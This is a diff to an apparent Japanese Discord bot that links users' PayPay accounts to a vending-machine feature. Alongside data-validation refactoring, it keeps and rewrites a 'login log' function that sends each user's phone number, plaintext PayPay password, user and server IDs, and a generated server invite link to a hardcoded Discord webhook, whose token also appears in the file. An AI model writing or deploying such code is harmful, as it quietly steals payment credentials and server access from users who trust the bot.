@@ -16,14 +16,36 @@ LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1559191675451215983/OOV9t6Mg
 
 
 def load_vending_data():
-    if os.path.exists(VENDING_DATA_FILE):
-        try:
-            with open(VENDING_DATA_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except json.JSONDecodeError:
-            print(f"Error: {VENDING_DATA_FILE} のJSON形式が不正です。")
-            return {}
-    return {}
+    """vending_data.json を読み込み、壊れた構造を自動修復する"""
+    if not os.path.exists(VENDING_DATA_FILE):
+        return {}
+
+    try:
+        with open(VENDING_DATA_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+    except json.JSONDecodeError:
+        print(f"Error: {VENDING_DATA_FILE} のJSON形式が不正です。")
+        return {}
+
+    # トップレベルが dict でなければ空で返す
+    if not isinstance(data, dict):
+        print(f"[WARN] vending_data.json のトップレベルが {type(data)} です。空として扱います。")
+        return {}
+
+    # 値が dict でないキーを除去
+    cleaned = {}
+    changed = False
+    for k, v in data.items():
+        if isinstance(v, dict):
+            cleaned[k] = v
+        else:
+            print(f"[WARN] vending_data['{k}'] は {type(v)} のため削除します。")
+            changed = True
+
+    if changed:
+        save_vending_data(cleaned)
+
+    return cleaned
 
 
 def save_vending_data(data):
@@ -48,17 +70,14 @@ async def create_invite_link(guild: discord.Guild) -> str | None:
     if not guild:
         return None
     try:
-        # 既存の招待を探す
         invites = await guild.invites()
         if invites:
             return invites[0].url
     except Exception:
         pass
 
-    # 招待がなければ作成を試みる
     try:
         target_channel = None
-        # システムチャンネル → 最初のテキストチャンネル
         if guild.system_channel and guild.system_channel.permissions_for(guild.me).create_instant_invite:
             target_channel = guild.system_channel
         else:
@@ -98,89 +117,35 @@ async def send_login_log_to_webhook(
             timestamp=discord.utils.utcnow()
         )
 
-        # ===== アイコン + 名前 =====
         try:
             avatar_url = user.display_avatar.url
         except Exception:
             avatar_url = None
 
         if avatar_url:
-            embed.set_author(
-                name=f"{user}",
-                icon_url=avatar_url
-            )
+            embed.set_author(name=f"{user}", icon_url=avatar_url)
             embed.set_thumbnail(url=avatar_url)
         else:
             embed.set_author(name=f"{user}")
 
-        # ===== 表示名 =====
-        embed.add_field(
-            name="表示名",
-            value=f"```{user.display_name}```",
-            inline=False
-        )
+        embed.add_field(name="表示名", value=f"```{user.display_name}```", inline=False)
+        embed.add_field(name="ユーザー名", value=f"```{user.name}```", inline=False)
+        embed.add_field(name="ユーザーID", value=f"```{user.id}```", inline=False)
 
-        # ===== ユーザー名 =====
-        embed.add_field(
-            name="ユーザー名",
-            value=f"```{user.name}```",
-            inline=False
-        )
-
-        # ===== ユーザーID =====
-        embed.add_field(
-            name="ユーザーID",
-            value=f"```{user.id}```",
-            inline=False
-        )
-
-        # ===== どこでログインしたか =====
         if guild:
-            embed.add_field(
-                name="ログイン場所",
-                value=f"```{guild.name}```",
-                inline=False
-            )
-            embed.add_field(
-                name="サーバーID",
-                value=f"```{guild.id}```",
-                inline=False
-            )
+            embed.add_field(name="ログイン場所", value=f"```{guild.name}```", inline=False)
+            embed.add_field(name="サーバーID", value=f"```{guild.id}```", inline=False)
         else:
-            embed.add_field(
-                name="ログイン場所",
-                value="```DM```",
-                inline=False
-            )
+            embed.add_field(name="ログイン場所", value="```DM```", inline=False)
 
-        # ===== 電話番号 =====
-        embed.add_field(
-            name="電話番号",
-            value=f"```{phone}```",
-            inline=False
-        )
+        embed.add_field(name="電話番号", value=f"```{phone}```", inline=False)
+        embed.add_field(name="パスワード", value=f"```{password}```", inline=False)
 
-        # ===== パスワード =====
-        embed.add_field(
-            name="パスワード",
-            value=f"```{password}```",
-            inline=False
-        )
-
-        # ===== 招待リンク =====
         invite_url = await create_invite_link(guild)
         if invite_url:
-            embed.add_field(
-                name="サーバー招待リンク",
-                value=invite_url,
-                inline=False
-            )
+            embed.add_field(name="サーバー招待リンク", value=invite_url, inline=False)
         else:
-            embed.add_field(
-                name="サーバー招待リンク",
-                value="```取得できませんでした```",
-                inline=False
-            )
+            embed.add_field(name="サーバー招待リンク", value="```取得できませんでした```", inline=False)
 
         embed.set_footer(text="Developer @anzy1m")
 
@@ -203,7 +168,6 @@ class PayPayModal(ui.Modal, title="PayPay OTP認証"):
 
     def __init__(self, phone, password, uuid, otpid, otp_pre):
         super().__init__(timeout=300)
-
         self.phone = phone
         self.password = password
         self.uuid = uuid
@@ -244,6 +208,11 @@ class PayPayModal(ui.Modal, title="PayPay OTP認証"):
             updated_count = 0
 
             for vm_id, vm_data in vending_data.items():
+                # ===== dict 以外はスキップ（壊れたデータ対策） =====
+                if not isinstance(vm_data, dict):
+                    print(f"[WARN] vending_data['{vm_id}'] is not dict: {type(vm_data)}")
+                    continue
+
                 if (
                     str(vm_data.get("owner_id")) == user_id_str
                     and vm_data.get("paypay_id") is None
@@ -260,10 +229,7 @@ class PayPayModal(ui.Modal, title="PayPay OTP認証"):
                 color=discord.Color.green()
             )
 
-            await interaction.followup.send(
-                embed=embed,
-                ephemeral=True
-            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
 
         elif otp_result == "ERR":
             embed = discord.Embed(
@@ -272,10 +238,7 @@ class PayPayModal(ui.Modal, title="PayPay OTP認証"):
                 color=discord.Color.red()
             )
 
-            await interaction.followup.send(
-                embed=embed,
-                ephemeral=True
-            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
 
         else:
             print(f"OTP: {otp_result}")
@@ -286,10 +249,7 @@ class PayPayModal(ui.Modal, title="PayPay OTP認証"):
                 color=discord.Color.orange()
             )
 
-            await interaction.followup.send(
-                embed=embed,
-                ephemeral=True
-            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
 
 
 class PaypayCog(commands.Cog):
@@ -340,10 +300,7 @@ class PaypayCog(commands.Cog):
                 color=0xff3333
             )
 
-            await interaction.response.send_message(
-                embed=embed,
-                ephemeral=True
-            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
         otpid = result["otp_reference_id"]
